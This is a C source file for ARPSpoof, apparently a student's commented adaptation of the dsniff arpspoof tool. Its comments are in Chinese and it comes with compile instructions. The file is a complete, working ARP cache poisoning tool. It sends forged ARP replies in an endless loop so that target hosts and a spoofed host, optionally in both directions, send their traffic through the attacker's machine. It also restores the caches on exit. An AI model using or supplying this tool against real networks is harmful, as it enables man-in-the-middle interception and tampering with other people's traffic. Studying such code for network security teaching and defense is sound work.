/*
 * ARPSpoof.c
 *
 * combine arp.h arp.c and arpspoof.c 
 * compile: gcc ARPSpoof.c -o ARPSpoof -lnet -lpcap
 * designed by ningxiao,PB13011066 2016
 */

#include <sys/types.h>
#include <sys/param.h>
#include <sys/socket.h>
#ifdef BSD
#include <sys/sysctl.h>
#include <net/if_dl.h>
#include <net/route.h>
#ifdef __FreeBSD__	/* XXX */
#define ether_addr_octet octet
#endif
#else /* !BSD */
#include <sys/ioctl.h>
#ifndef __linux__
#include <sys/sockio.h>
#endif
#endif /* !BSD */   //依据不同的系统(是否为BSD)来include不同的头文件
#include <net/if.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <err.h>
#include <libnet.h>  //
#include <pcap.h>    //这两个头文件是下载libnet1和libpcap来依赖的
#include <unistd.h>
#include <string.h>

//#include "arp.h"    //直接用arp.h的内容替代
#ifndef _ARP_H_
#define _ARP_H_

int	arp_cache_lookup(in_addr_t ip, struct ether_addr *ether, const char* linf);

#endif /* _ARP_H_ */

//#include "version.h"
#define VERSION		"2.4" //定义版本号

/***************************************************************/
/***************************************************************/

#ifdef BSD  //unix下的操作系统
int
arp_cache_lookup(in_addr_t ip, struct ether_addr *ether, const char* linf)
{	//针对BSD系统	
	//用来获取ip对应的mac地址
	int mib[6];
	size_t len;
	char *buf, *next, *end;
	struct rt_msghdr *rtm;
	struct sockaddr_inarp *sin;
	struct sockaddr_dl *sdl;
	
	mib[0] = CTL_NET;
	mib[1] = AF_ROUTE;
	mib[2] = 0;
	mib[3] = AF_INET;
	mib[4] = NET_RT_FLAGS;
	mib[5] = RTF_LLINFO;
	
	if (sysctl(mib, 6, NULL, &len, NULL, 0) < 0)
		return (-1);
	
	if ((buf = (char *)malloc(len)) == NULL)
		return (-1);
	
	if (sysctl(mib, 6, buf, &len, NULL, 0) < 0) {
		free(buf);
		return (-1);
	}
	end = buf + len;
	//buff中包含arp cache中的所有结果
	for (next = buf ; next < end ; next += rtm->rtm_msglen) {
	//for循环用来逐一匹配IP地址,若匹配到则在ether中返回对于的mac地址,然后退出
		rtm = (struct rt_msghdr *)next;
		sin = (struct sockaddr_inarp *)(rtm + 1);
		sdl = (struct sockaddr_dl *)(sin + 1);
		
		if (sin->sin_addr.s_addr == ip && sdl->sdl_alen) {
			memcpy(ether->ether_addr_octet, LLADDR(sdl),
			       ETHER_ADDR_LEN);
			free(buf);
			return (0);
		}
	}
	free(buf);
	
	return (-1);
}

#else /* !BSD */

#ifndef ETHER_ADDR_LEN	/* XXX - Solaris */
#define ETHER_ADDR_LEN	6 	//定义以太网地址,即mac地址的长度为6字节
#endif

int
arp_cache_lookup(in_addr_t ip, struct ether_addr *ether, const char* lif)
{	//针对非BSD
	//用来获取ip对应的mac地址
	int sock;
	struct arpreq ar;
	struct sockaddr_in *sin;
	
	memset((char *)&ar, 0, sizeof(ar));  //将ar的内容初始化为0
#ifdef __linux__   //linux
	strncpy(ar.arp_dev,  lif, strlen(lif));
#endif
	sin = (struct sockaddr_in *)&ar.arp_pa;
	sin->sin_family = AF_INET;
	sin->sin_addr.s_addr = ip;
	
	if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
		return (-1);
	}
	if (ioctl(sock, SIOCGARP, (caddr_t)&ar) == -1) {
		close(sock);
		return (-1);
	}
	close(sock);
	memcpy(ether->ether_addr_octet, ar.arp_ha.sa_data, ETHER_ADDR_LEN);
	
	return (0);
}

#endif /* !BSD */

extern char *ether_ntoa(struct ether_addr *);

struct host {
	in_addr_t ip;
	struct ether_addr mac;
};

static libnet_t *l;
static struct host spoof = {0};
static struct host *targets;
static char *intf;
static int poison_reverse;

static uint8_t *my_ha = NULL;//自己的地址
static uint8_t *brd_ha = "\xff\xff\xff\xff\xff\xff";//广播地址
//cleanup 操作选项
static int cleanup_src_own = 1;
static int cleanup_src_host = 0;

static void
usage(void)
{//用户输入命令行参数有错误时,输出该提示
	fprintf(stderr, "Version: " VERSION "\n"
		"Usage: arp [-i interface] [-c own|host|both] [-t target] [-r] host\n");
	printf("Author:XiaoNing,PB13011066\n");
	exit(1);
}

static int
arp_send(libnet_t *l, int op,
	u_int8_t *sha, in_addr_t spa,
	u_int8_t *tha, in_addr_t tpa,
	u_int8_t *me)
//用于发送欺骗消息的函数,是ARP攻击的主要函数
{
	int retval;

	if (!me) me = sha; //me为空,赋上缺省值

	libnet_autobuild_arp(op, sha, (u_int8_t *)&spa,
			     tha, (u_int8_t *)&tpa, l);//建立arp包
	libnet_build_ethernet(tha, me, ETHERTYPE_ARP, NULL, 0, l, 0);
	//建立自己以太网地址和目标主机地址之间的连接			
	
	fprintf(stderr, "%s ",
		ether_ntoa((struct ether_addr *)me));//打印自己的地址信息

	if (op == ARPOP_REQUEST) {
		fprintf(stderr, "%s 0806 42: arp who-has %s tell %s\n",
			ether_ntoa((struct ether_addr *)tha),
			libnet_addr2name4(tpa, LIBNET_DONT_RESOLVE),
			libnet_addr2name4(spa, LIBNET_DONT_RESOLVE));
	}
	else {
		fprintf(stderr, "%s 0806 42: arp reply %s is-at ",
			ether_ntoa((struct ether_addr *)tha),
			libnet_addr2name4(spa, LIBNET_DONT_RESOLVE));
		fprintf(stderr, "%s\n",
			ether_ntoa((struct ether_addr *)sha));
	}
	retval = libnet_write(l);//发送包
	if (retval)
		fprintf(stderr, "%s", libnet_geterror(l));

	libnet_clear_packet(l);//清除包

	return retval;
}

#ifdef __linux__
static int
arp_force(in_addr_t dst)
{
	struct sockaddr_in sin;
	int i, fd;
	
	if ((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
		return (0);

	memset(&sin, 0, sizeof(sin)); //初始化
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = dst;
	sin.sin_port = htons(67);
	
	i = sendto(fd, NULL, 0, 0, (struct sockaddr *)&sin, sizeof(sin));
	
	close(fd);
	
	return (i == 0);
}
#endif

static int
arp_find(in_addr_t ip, struct ether_addr *mac)
{//查找ip对应的mac地址
	int i = 0;

	do {
		if (arp_cache_lookup(ip, mac, intf) == 0)
			return (1);//arp_cache_lookup成功执行,返回1表示成功
#ifdef __linux__
		/* XXX - force the kernel to arp. feh. */
		arp_force(ip);
#else
		arp_send(l, ARPOP_REQUEST, NULL, 0, NULL, ip, NULL);//发送ARP请求来获取相关信息
#endif
		sleep(1);  //停顿
	}
	while (i++ < 3);//一旦查找失败就执行arp_force或者arp_send函数来刷新cache,若三次失败则当作匹配失败,退出循环

	return (0);//如果3次还没有成功,返回0表示失败
}

static int arp_find_all() {
//查找所有的IP地址
	struct host *target = targets;
	while(target->ip) {
		if (arp_find(target->ip, &target->mac)) {
			return 1;
		//如果存在一个IP和mac的匹配信息,则返回1
		}
		target++;
	}

	return 0;//如果都匹配不了,返回0
	
}

static void
cleanup(int sig)
{
	int fw = arp_find(spoof.ip, &spoof.mac);//查找要欺骗的ip地址对应的MAC地址
	int bw = poison_reverse && targets[0].ip && arp_find_all();
	//第一项是-r tag
	//第二项是为了确保存在至少一个目标
	//第三项判断目标IP中是否有匹配MAC
	int i;
	int rounds = (cleanup_src_own*5 + cleanup_src_host*5);//操作次数

	fprintf(stderr, "Cleaning up and re-arping targets...\n");
	for (i = 0; i < rounds; i++) {
		struct host *target = targets;
		while(target->ip) {
			uint8_t *src_ha = NULL;
			if (cleanup_src_own && (i%2 || !cleanup_src_host)) {
				src_ha = my_ha;
			}
			/* XXX - on BSD, requires ETHERSPOOF kernel. */
			if (fw) {
				arp_send(l, ARPOP_REPLY,
					 (u_int8_t *)&spoof.mac, spoof.ip,
					 (target->ip ? (u_int8_t *)&target->mac : brd_ha),
					 target->ip,
					 src_ha);
			//发送欺骗主机的ip和mac地址给目标主机
				sleep(1);
			}
			if (bw) {
				arp_send(l, ARPOP_REPLY,
					 (u_int8_t *)&target->mac, target->ip,
					 (u_int8_t *)&spoof.mac,
					 spoof.ip,
					 src_ha);
			//发送目标主机的ip和mac地址给欺骗主机
				sleep(1);
			}
			target++;
		}
	}

	exit(0);
}

int
main(int argc, char *argv[])
{
	extern char *optarg;//用于getopt函数:选项的参数指针
	extern int optind;//用于getopt函数:下一次调用optind时,从optind存储的位置重新开始检查选项
	char pcap_ebuf[PCAP_ERRBUF_SIZE];//存储libpcap函数的错误信息
	char libnet_ebuf[LIBNET_ERRBUF_SIZE];//存储libpcap函数的错误信息
	int c;
	int n_targets;//目标数
	char *cleanup_src = NULL;//cleanup选项

	spoof.ip = 0;
	intf = NULL;
	poison_reverse = 0;//-r tag
	n_targets = 0;

	/* allocate enough memory for target list */
	targets = calloc( argc+1, sizeof(struct host) );//static struct host *targets;
	//用来分析命令行参数,包括选项,输入内容等
	while ((c = getopt(argc, argv, "ri:t:c:h?V")) != -1) {
		switch (c) {
		case 'i'://硬件接口选项
			intf = optarg;
			break;
		case 't'://欺骗目标
			if ((targets[n_targets++].ip = libnet_name2addr4(l, optarg, LIBNET_RESOLVE)) == -1)
				usage();
			break;
		case 'r'://poison_reverse,双向欺骗
			poison_reverse = 1;
			break;
		case 'c'://clean up
			cleanup_src = optarg;
			break;
		default:
			usage();//不合法的参数,调用usage函数输出提示信息
		}
	}
	argc -= optind;//减去optind用于argc之后的检查
	argv += optind;//使得argv指向欺骗IP
	
	if (argc != 1)
		usage();//参数不对

	if (poison_reverse && !n_targets) {
		//使用-r时必须指定-t目标
		errx(1, "Spoofing the reverse path (-r) is only available when specifying a target (-t).");
		usage();
	}
	
	if (!cleanup_src || strcmp(cleanup_src, "own")==0) { /* default! */
		/* only use our own hw address when cleaning up,
		 * not jeopardizing any bridges on the way to our
		 * target
		 */
		cleanup_src_own = 1;
		cleanup_src_host = 0;
	} else if (strcmp(cleanup_src, "host")==0) {
		/* only use the target hw address when cleaning up;
		 * this can screw up some bridges and scramble access
		 * for our own host, however it resets the arp table
		 * more reliably
		 */
		cleanup_src_own = 0;
		cleanup_src_host = 1;
	} else if (strcmp(cleanup_src, "both")==0) {
		cleanup_src_own = 1;
		cleanup_src_host = 1;
	} else {
		errx(1, "Invalid parameter to -c: use 'own' (default), 'host' or 'both'.");
		usage();
	}

	if ((spoof.ip = libnet_name2addr4(l, argv[0], LIBNET_RESOLVE)) == -1)		//前面的argv += optind使argv指向欺骗ip
		//libnet_name2addr4:解析ip地址,结果存到spoof.ip和l中
		usage();
	
	if (intf == NULL && (intf = pcap_lookupdev(pcap_ebuf)) == NULL)
		errx(1, "%s", pcap_ebuf);
		//如果没有用-i指定设备,则使用pcap_lookupdev来设置缺省值

	if ((l = libnet_init(LIBNET_LINK, intf, libnet_ebuf)) == NULL)//link layer,intf refers to the device(netcard)
		errx(1, "%s", libnet_ebuf);

	struct host *target = targets;
	while(target->ip) {
		if (target->ip != 0 && !arp_find(target->ip, &target->mac))
		//检测每个目标的ip地址是否存在并且检测是否有匹配的mac地址
			errx(1, "couldn't arp for host %s",
			libnet_addr2name4(target->ip, LIBNET_DONT_RESOLVE));//输出无法匹配的ip地址
		target++;
	}

	if (poison_reverse) {
		if (!arp_find(spoof.ip, &spoof.mac)) {//find host mac address
			errx(1, "couldn't arp for spoof host %s",
			     libnet_addr2name4(spoof.ip, LIBNET_DONT_RESOLVE));
		}
	}

	if ((my_ha = (u_int8_t *)libnet_get_hwaddr(l)) == NULL) {
	//获得自身硬件的mac地址
		errx(1, "Unable to determine own mac address");
	}

	//有以下信号中断时,执行cleanup
	signal(SIGHUP, cleanup);//hanging up挂起
	signal(SIGINT, cleanup);//中断:"ctrl+c"
	signal(SIGTERM, cleanup);//软件中断
	printf("Author:XiaoNing,PB13011066\n");
	for (;;) {
		struct host *target = targets;
		while(target->ip) {
			arp_send(l, ARPOP_REPLY, my_ha, spoof.ip,
				(target->ip ? (u_int8_t *)&target->mac : brd_ha),
				target->ip,
				my_ha);
		//将自己的mac地址和欺骗的ip信息结合发送给给目标主机
		//如果没目标ip就广播				
			if (poison_reverse) {
				arp_send(l, ARPOP_REPLY, my_ha, target->ip, (uint8_t *)&spoof.mac, spoof.ip, my_ha);
		//将自己硬件地址和目标ip结合,发给欺骗主机
			}
			
			target++;
		}

		sleep(2);
	}
	/* NOTREACHED */

	exit(0);
}
